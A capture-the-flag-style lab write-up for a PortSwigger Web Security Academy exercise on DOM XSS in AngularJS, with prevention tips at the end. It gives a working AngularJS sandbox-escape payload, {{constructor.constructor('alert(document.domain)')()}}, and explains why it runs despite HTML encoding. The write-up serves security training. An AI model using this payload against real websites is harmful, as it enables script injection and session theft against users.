# 🚨 Lab 29 — DOM XSS in AngularJS Expression with Angle Brackets and Double Quotes HTML-Encoded

## 🧪 Lab Details

| Field | Value |
|---|---|
| **Lab No** | 29 |
| **Lab Name** | DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded |
| **Category** | DOM XSS |
| **Platform** | PortSwigger Web Security Academy |

---

# 🎯 Goal

Execute JavaScript using an AngularJS expression.

---

# 🔍 Injection Point

- URL Search Bar

---

# 💣 Payload

```javascript
{{constructor.constructor('alert(document.domain)')()}}
```

---

# 🧠 Vulnerability Overview

The application uses AngularJS templates and reflects user-controlled input into an AngularJS expression context.

Even though:

```text
< >
"
```

are encoded, AngularJS expressions still execute.

---

# ⚔️ Exploitation Steps

## 1️⃣ Inject Payload

```javascript
{{constructor.constructor('alert(document.domain)')()}}
```

---

## 2️⃣ AngularJS Parses Expression

AngularJS evaluates expressions inside:

```javascript
{{ }}
```

---

## 3️⃣ Execute JavaScript

The payload abuses:

```javascript
constructor.constructor()
```

to access the JavaScript `Function` constructor.

---

## 4️⃣ Trigger Alert

```javascript
alert(document.domain)
```

executes successfully.

✅ AngularJS DOM XSS Successfully Triggered

---

# 🧨 Why It Works

AngularJS expressions can execute JavaScript-like code when user input is not sanitized properly.

---

# 🛡️ Prevention

## ✅ Disable Dangerous Template Evaluation

Avoid evaluating untrusted AngularJS expressions.

---

## ✅ Upgrade Frameworks

Older AngularJS versions are especially vulnerable to sandbox escapes.

---

## ✅ Sanitize User Input

Never trust template-controlled input.

---

# 💡 Key Takeaway

Framework-specific template engines like AngularJS can introduce unique XSS vectors even when traditional HTML injection is blocked.
